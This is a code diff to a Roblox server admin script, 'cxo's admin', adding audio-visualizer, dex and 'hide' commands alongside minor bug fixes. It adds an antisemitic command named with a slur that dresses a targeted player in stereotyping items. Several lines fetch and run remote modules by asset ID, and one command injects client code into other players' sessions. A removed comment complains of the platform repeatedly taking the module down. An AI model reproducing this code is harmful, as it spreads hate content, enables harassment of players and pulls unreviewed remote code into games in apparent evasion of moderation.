@@ -52,6 +52,8 @@ local anticheatmeasure = {}
 local panelanticheat = {}
 local autodelete = {}
 local configs = {}
+local plrcfgs = {}
+local plrparts = {}
 local emojis = {"❓", "⌨️🖱️", "📱", "🎮", "🥽", "🖱️", "⌨️"}
 local locked = false
 local guiactive = false
@@ -62,8 +64,6 @@ local connected, connected2, banhammered, ignorethis, ignorethistoo, V1, music, 
 
 local prefix = "/"
 local tag = true
-
--- Thanks roblox for taking down my module every time i upload this script --
 
 -------------------------------------------- SETUP --------------------------------------------
 
@@ -1238,6 +1238,8 @@ function notfi(plr, title, message, duration) -- dizzy ui
 	end)()
 end
 
+require(72300568939183).load() -- maxwell the cat
+
 -------------------------------------------- COMMANDS --------------------------------------------
 
 addcmd({
@@ -2384,6 +2386,62 @@ addcmd({
 })
 
 addcmd({
+	Name = "jew",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			function givehat(v, hat)
+				coroutine.resume(coroutine.create(function()
+					if v and v.Character then
+						local obj = game:service("InsertService"):LoadAsset(hat)
+						for a, hat in pairs(obj:children()) do
+							if hat:IsA("Accessory") or hat:IsA("Hat") then
+								hat.Parent = v.Character
+							end
+						end
+						obj:Destroy()
+					end
+				end))
+			end
+			function giveshirt(v, id)
+				if v and v.Character then
+					for i, c in pairs(v.Character:children()) do
+						if c:IsA("Shirt") then
+							c:Destroy() -- Fixed the typo
+						end
+					end
+					local cl = Instance.new("Shirt", v.Character)
+					cl.ShirtTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
+				end
+			end
+			function givepants(v, id)
+				if v and v.Character then
+					for i, c in pairs(v.Character:children()) do
+						if c:IsA("Pants") then
+							c:Destroy()
+						end
+					end
+					local cl = Instance.new("Pants", v.Character)
+					cl.PantsTemplate = "http://www.roblox.com/asset/?id=" .. tonumber(id - 1)
+				end
+			end
+			for i,v in plr.Character:GetChildren() do
+				if v:IsA("Accessory") then
+					v:Destroy()
+				end
+			end
+			givehat(plr, 12101418657)
+			givehat(plr, 18367644870)
+			givehat(plr, 8107902065)
+			givehat(plr, 6133262085)
+			giveshirt(plr, 159269845)
+			givepants(plr, 159269873)
+			-- Kozy was here im afraid
+		end
+	end
+})
+
+addcmd({
 	Name = "musiclock",
 	Aliases = {"musicloop", "lockmusic"},
 	Player = false,
@@ -2396,7 +2454,7 @@ addcmd({
 			end
 		end
 
-		if arg ~= "" and arg ~= "n" and arg ~= "t" then
+		if arg and arg ~= "" and arg ~= "n" and arg ~= "t" then
 			music = Instance.new("Sound", game.Soundscape)
 			music.SoundId = arg
 			music.Name = "cxo's admin sound"
@@ -2674,7 +2732,18 @@ addcmd({
 					if not parts[z.CFrame] then
 						print(z.Name)
 						local cloned = z:Clone()
-						local parent = Tabby:FindFirstChild(cloned.Parent:GetFullName():gsub("^".. BackupTabby:GetFullName(), Tabby:GetFullName()), true)
+						if cloned.Parent then
+							local parentname = cloned.Parent:GetFullName():gsub("^".. BackupTabby:GetFullName(), Tabby:GetFullName())
+							local parent = Tabby:FindFirstChild(parentname, true)
+							if parent then
+								cloned.Parent = parent
+							else
+								notfi(sender, "cxo's admin", "Failed to find correct parent for: ".. cloned.Name)
+							end
+						else
+							notfi(sender, "cxo's admin", "cloned.Parent is nil for: ".. cloned.Name)
+						end
+						--local parent = Tabby:FindFirstChild(cloned.Parent:GetFullName():gsub("^".. BackupTabby:GetFullName(), Tabby:GetFullName()), true)
 						if parent then
 							cloned.Parent = parent
 						else
@@ -2747,6 +2816,7 @@ addcmd({
 			if table.find(_G.permadmins, plr.Name) then
 				print(plr.Name .. " perm")
 				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
+				print("removed ".. plr.Name)
 			end
 			if table.find(_G.tempadmins, plr.Name) then
 				table.remove(_G.tempadmins, table.find(_G.tempadmins, plr.Name))
@@ -3127,7 +3197,7 @@ addcmd({
 
 		for i, plr in ipairs(targets) do
 
-			if audio == "" then
+			if audio == "t" then
 				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
 				local utilities = game:GetService("ServerScriptService").goog.Utilities
 				local loa = utilities:FindFirstChild("loadstring")
@@ -4151,7 +4221,23 @@ addcmd({
 
 addcmd({
 	Name = "dex",
-	Aliases = {},
+	Aliases = {"ssdex"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local success, fail = pcall(function()
+				require(12146718110):Fire(plr.Name)
+			end)
+
+			if fail then
+				notfi(sender, "cxo's admin", "Dex failed to load: ".. fail)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "clientdex",
+	Aliases = {"csdex"},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			local success, fail = pcall(function()
@@ -5744,6 +5830,335 @@ addcmd({
 })
 
 addcmd({
+	Name = "vis",
+	Aliases = {"visualizer", "v"},
+	Function = function(sender, targets, arguments)
+		local a = arguments[1]
+		for i, plr in ipairs(targets) do
+			task.spawn(function()
+
+				if a:lower() == "off" or a:lower() == "false" then
+					if workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")") then
+						workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")"):Destroy()
+					end
+					if plr.PlayerGui:FindFirstChild("cxo's vis") then
+						plr.PlayerGui:FindFirstChild("cxo's vis"):Destroy()
+					elseif plr.Character:FindFirstChild("cxo's vis") then
+						plr.Character:FindFirstChild("cxo's vis"):Destroy()
+					end
+					return
+				elseif a:lower() == "on" or a:lower() == "true" then
+					if not workspace:FindFirstChild("cxo's admin vis (".. plr.Name ..")") then
+
+						local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+						local utilities = game:GetService("ServerScriptService").goog.Utilities
+						local loa = utilities:FindFirstChild("loadstring")
+						
+						if loa then
+							loa = loa:Clone()
+						else
+							loa = utilities:FindFirstChild("Loadstring")
+							if loa then
+								loa = loa:Clone()
+							end
+						end
+						
+						if not loa then
+							warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+						end
+
+						loa.Parent = scr
+						scr:WaitForChild("Exec").Value = [[
+
+						local event = workspace:WaitForChild("cxo's admin vis (".. game.Players.LocalPlayer.Name ..")"):WaitForChild("SoundLoudnessEvent")
+						
+						game:GetService("RunService").RenderStepped:Connect(function()
+							local sound = game.Workspace:WaitForChild("Sound")
+							if sound and sound.Parent then
+								if sound.IsPlaying then
+									local loudness = sound.PlaybackLoudness
+									event:FireServer(loudness)
+								else
+									event:FireServer(0)
+								end
+							else
+								event:FireServer(0)
+							end
+						end)
+
+						]]
+
+						if plr.PlayerGui then
+							scr.Parent = plr.PlayerGui
+						else
+							if plr.Character then
+								scr.Parent = plr.Character
+							end
+						end
+
+						scr.Name = "cxo's vis"
+						scr.Enabled = true
+
+						plrparts[plr.Name] = {}
+
+						local parts = plrparts[plr.Name]
+						if not plrcfgs[plr.Name] then
+							plrcfgs[plr.Name] = {
+								radius = 20,
+								amount = 15,
+								speed = 1,
+								height = 0.5,
+								sizeX = 4,
+								sizeY = 1.2,
+								sizeZ = 2,
+								maxradius = 35,
+								minradius = 10,
+								mode = "default",
+								colourR = 0,
+								colourG = 0,
+								colourB = 0,
+								material = "Plastic",
+								hue = 0,
+								colour = false,
+								sensitivity = 1,
+								reflectance = 0,
+							}
+						end
+
+						local lastpbs = 0
+						local hue = plrcfgs[hue]
+						local colour = plrcfgs[colour]
+						local cfgs = plrcfgs[plr.Name]
+
+						local eventconnection
+						local heartbeatconnection
+						local connectedion
+						local removedconnection
+						local rs = game:GetService("RunService")
+						local p = plr
+						local c = p.Character or p.CharacterAdded:Wait()
+						local hrp = c:WaitForChild("HumanoidRootPart")
+
+						local f = Instance.new("Folder", workspace)
+						f.Name = "cxo's admin vis (".. p.Name ..")"
+
+						local re = Instance.new("RemoteEvent", f)
+						re.Name = "SoundLoudnessEvent"
+
+						local event = re
+
+						create(p, f, cfgs.amount, cfgs.sizeX, cfgs.sizeY, cfgs.sizeZ)
+
+						eventconnection = event.OnServerEvent:Connect(function(player, loudness)
+							if player == p then
+								if loudness == 0 then
+									cfgs.radius = cfgs.minradius
+								else
+									local scale = math.clamp(loudness / 100, 0, 1)
+									cfgs.radius = cfgs.minradius + (cfgs.maxradius - cfgs.minradius) * scale
+								end
+
+								if math.abs(loudness - lastpbs) > cfgs.sensitivity then
+									updatec(p)
+								end
+
+								lastpbs = loudness
+							end
+						end)
+
+						heartbeatconnection = rs.Heartbeat:Connect(function()
+
+							if not c or not hrp or not hrp.Parent then
+								return
+							end
+
+							if not workspace:FindFirstChild("cxo's admin vis (".. p.Name .. ")") then
+								eventconnection:Disconnect()
+								connectedion:Disconnect()
+								heartbeatconnection:Disconnect()
+							end
+
+							local time = tick() * cfgs.speed
+							local hrpp = hrp.Position + Vector3.new(0, cfgs.height, 0)
+
+							for i, part in pairs(parts) do
+								local angle = math.rad((i - 1) * (360 / cfgs.amount) + time * 100)
+								local rotation = math.rad(30 * math.sin(time + i * 0.1))
+								local x = math.cos(angle) * cfgs.radius
+								local z = math.sin(angle) * cfgs.radius
+								part.CFrame = CFrame.new(hrpp + Vector3.new(x, 0, z)) * CFrame.Angles(0, rotation + math.pi / 2, 0) * CFrame.Angles(0, math.rad(i * 30) + os.clock() * 5, 0)
+							end
+						end)
+
+						connectedion = p.CharacterAdded:Connect(function(character)
+							c = character
+							hrp = c:WaitForChild("HumanoidRootPart")
+
+							repeat task.wait() until character and game.Players:FindFirstChild(character.Name).PlayerGui
+
+							local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+							local utilities = game:GetService("ServerScriptService").goog.Utilities
+							local loa = utilities:FindFirstChild("loadstring")
+							
+							if loa then
+								loa = loa:Clone()
+							else
+								loa = utilities:FindFirstChild("Loadstring")
+								if loa then
+									loa = loa:Clone()
+								end
+							end
+							
+							if not loa then
+								warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+							end
+		
+							loa.Parent = scr
+							scr:WaitForChild("Exec").Value = [[
+		
+							local event = workspace:WaitForChild("cxo's admin vis (".. game.Players.LocalPlayer.Name ..")"):WaitForChild("SoundLoudnessEvent")
+							
+							game:GetService("RunService").RenderStepped:Connect(function()
+								local sound = game.Workspace:WaitForChild("Sound")
+								if sound and sound.Parent then
+									if sound.IsPlaying then
+										local loudness = sound.PlaybackLoudness
+										event:FireServer(loudness)
+									else
+										event:FireServer(0)
+									end
+								else
+									event:FireServer(0)
+								end
+							end)
+		
+							]]
+
+							if game.Players:FindFirstChild(character.Name).PlayerGui then
+								scr.Parent = game.Players:FindFirstChild(character.Name).PlayerGui
+							else
+								if character then
+									scr.Parent = character
+								end
+							end
+		
+							scr.Name = "cxo's vis"
+							scr.Enabled = true
+
+						end)
+
+						removedconnection = game.Players.ChildRemoved:Connect(function(v)
+							if v.Name == p.Name then
+								heartbeatconnection:Disconnect()
+								eventconnection:Disconnect()
+								connectedion:Disconnect()
+								removedconnection:Disconnect()
+							end
+						end)
+
+					end
+				end                                       
+			end)
+		end
+	end
+})
+
+addcmd({
+	Name = "vissettings",
+	Aliases = {"visualizersettings", "vsettings"},
+	Function = function(sender, targets, arguments)
+		local setting = arguments[1]
+		local args = arguments[2] --table.concat(arguments, " ", 2)
+		for i, plr in ipairs(targets) do
+			if setting == "maxradius" or setting == "minradius" or setting == "sensitivity" then
+				plrcfgs[plr.Name][setting] = tonumber(args)
+				updatec(plr)
+				return
+			end
+			if plrcfgs[plr.Name] then
+				plrcfgs[plr.Name][setting] = args
+				updatec(plr)
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "hide",
+	Aliases = {"ghost"},
+	Function = function(sender, targets, arguments)
+		task.spawn(function()
+			local plr
+		
+			if arguments[1] then
+				plr = arguments[1]
+			else
+				plr = sender.Name
+			end
+
+			if arg == "me" then
+				arg = sender.Name
+			end
+
+			local argt = p(plr, sender)
+
+			if #argt <= 0 then
+				notfi(sender, "cxo's admin", "Invalid user! command example: ".. prefix .."hide ripcxo")
+				return
+			end
+
+			local function hideplr(v)
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+					return
+				end
+
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = string.format([[
+
+					game.Players:FindFirstChild(%s):Destroy()
+
+				]], v)
+
+				for i,e in pairs(game.Players:GetPlayers()) do
+					if e.PlayerGui then
+						if e.PlayerGui:FindFirstChild("GODMODE") then return end
+						loa.Parent = e.PlayerGui
+					else
+						if e.Character then
+							if e.Character:FindFirstChild("GODMODE") then return end
+							loa.Parent = e.Character
+						end
+					end
+				end
+			end
+
+			hideplr(argt[1].Name)
+
+			game.Players.ChildAdded:Connect(function()
+				hideplr(argt[1].Name)
+			end)
+
+			scr.Name = "GODMODE"
+			scr.Enabled = true
+		end)
+	end
+})
+
+addcmd({
 	Name = "view",
 	Aliases = {"spectate"},
 	Player = false,
@@ -6090,6 +6505,7 @@ addcmd({
 						local loaded, fail = loadstring(content)
 						if loaded then
 							loaded()
+							_G.kidnap(plr)
 						else
 							notfi(sender, "cxo's admin", "Failed to load the clown van")
 						end
@@ -6264,12 +6680,10 @@ addcmd({
 		if torf:lower() == "true" then
 			tag = true
 			ftag()
-		else
+		elseif torf:lower() == "false" then
 			tag = false
 			for i,t in pairs(game.Teams:GetChildren()) do
-				if t.Name == "cxo's admin is loaded" then
-					t:Destroy()
-				elseif t.Name == "! cxo's admin is loaded !" then
+				if t.Name == "cxo's admin is loaded" or t.Name == "! cxo's admin is loaded !" then
 					t:Destroy()
 				end
 			end
@@ -6815,6 +7229,116 @@ function antikill(plr)
 	end)
 end
 ]]
+
+function create(plr, parent, amount, sizeX, sizeY, sizeZ)
+	local cfgs = plrcfgs[plr.Name]
+	for i = 1, amount do
+		local part = Instance.new("Part")
+		part.Name = "vis" .. i
+		part.Size = Vector3.new(sizeX, sizeY, sizeZ)
+		part.Anchored = true
+		part.CanCollide = false
+		part.Locked = true
+		part.Material = Enum.Material[cfgs.material] or Enum.Material.Plastic
+		part.Color = Color3.fromRGB(cfgs.colourR, cfgs.colourG, cfgs.colourB)
+		part.Parent = parent
+		table.insert(plrparts[plr.Name], part)
+	end
+end
+
+function updatec(plr)
+	local cfgs = plrcfgs[plr.Name]
+
+	if not plrparts[plr.Name] then
+        warn("Error: No parts found for " .. plr.Name)
+        return
+    end
+	
+	local parts = plrparts[plr.Name]
+
+	if cfgs.mode == "rainbow" then
+		cfgs.hue = (cfgs.hue + 5) % 360
+		local colour3 = Color3.fromHSV(cfgs.hue / 360, 1, 1)
+		for i, part in pairs(parts) do
+			if part:FindFirstChild("maxwell") then
+				part.maxwell:Destroy()
+			end
+			part.Material = cfgs.material
+			part.Reflectance = cfgs.reflectance
+			part.Color = colour3
+		end
+	elseif cfgs.mode == "redblue" then
+		cfgs.colour = not cfgs.colour
+		local colour3 = cfgs.colour and Color3.fromRGB(0, 0, 255) or Color3.fromRGB(200, 0, 0)
+		for i, part in pairs(parts) do
+			if part:FindFirstChild("maxwell") then
+				part.maxwell:Destroy()
+			end
+			part.Material = cfgs.material
+			part.Reflectance = cfgs.reflectance
+			part.Color = colour3
+		end
+	elseif cfgs.mode == "flicker" then
+		cfgs.colour = not cfgs.colour
+		local colour3 = cfgs.colour and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(255, 255, 255)
+		for i, part in pairs(parts) do
+			if part:FindFirstChild("maxwell") then
+				part.maxwell:Destroy()
+			end
+			part.Material = cfgs.material
+			part.Reflectance = cfgs.reflectance
+			part.Color = colour3
+		end
+	elseif cfgs.mode == "maxwell" then
+		for i, part in pairs(parts) do
+			if not part:FindFirstChild("maxwell") then
+				if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("maxwell") then
+					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("maxwell"):Clone()
+					local w = Instance.new("Weld", maxwell)
+					w.Part0 = part
+					w.Part1 = maxwell
+					maxwell.Anchored = false
+					maxwell.forgor.Anchored = false
+					maxwell.Parent = part
+					maxwell.Locked = true
+					part.Transparency = 1
+				elseif game:GetService("ReplicatedStorage"):FindFirstChild("maxwell") then
+					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("maxwell"):Clone()
+					local w = Instance.new("Weld", maxwell)
+					w.Part0 = part
+					w.Part1 = maxwell
+					maxwell.Anchored = false
+					maxwell.forgor.Anchored = false
+					maxwell.Parent = part
+					maxwell.Locked = true
+					part.Transparency = 1
+				else
+					require(72300568939183).load()
+					local maxwell = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("maxwell"):Clone()
+					local w = Instance.new("Weld", maxwell)
+					w.Part0 = part
+					w.Part1 = maxwell
+					maxwell.Anchored = false
+					maxwell.forgor.Anchored = false
+					maxwell.Parent = part
+					maxwell.Locked = true
+					part.Transparency = 1
+				end
+			end
+		end
+	else
+		local colour3 = Color3.fromRGB(cfgs.colourR, cfgs.colourG, cfgs.colourB)
+		for i, part in ipairs(parts) do
+			if part:FindFirstChild("maxwell") then
+				part.maxwell:Destroy()
+			end
+			part.Material = cfgs.material
+			part.Reflectance = cfgs.reflectance
+			part.Color = colour3
+		end
+	end
+end
+
 -------------------------------------------- CONNECTIONS --------------------------------------------
 
 for i,v in pairs(game.Players:GetPlayers()) do
@@ -8008,5 +8532,27 @@ for i,v in pairs(game.Players:GetPlayers()) do
 
 			--runcmd(arguments[1], nil, target and {target} or nil, {table.concat(arguments, " ", 3) or table.concat(arguments, " ", 2) or nil}, nil)
 		end
+	end
+	if not plrcfgs[v.Name] then
+		plrcfgs[v.Name] = {
+			radius = 20,
+			amount = 15,
+			speed = 1,
+			height = 0.5,
+			sizeX = 4,
+			sizeY = 1.2,
+			sizeZ = 2,
+			maxradius = 35,
+			minradius = 10,
+			mode = "default",
+			colourR = 0,
+			colourG = 0,
+			colourB = 0,
+			material = "Plastic",
+			hue = 0,
+			colour = false,
+			sensitivity = 1,
+			reflectance = 0,
+		}
 	end
 end
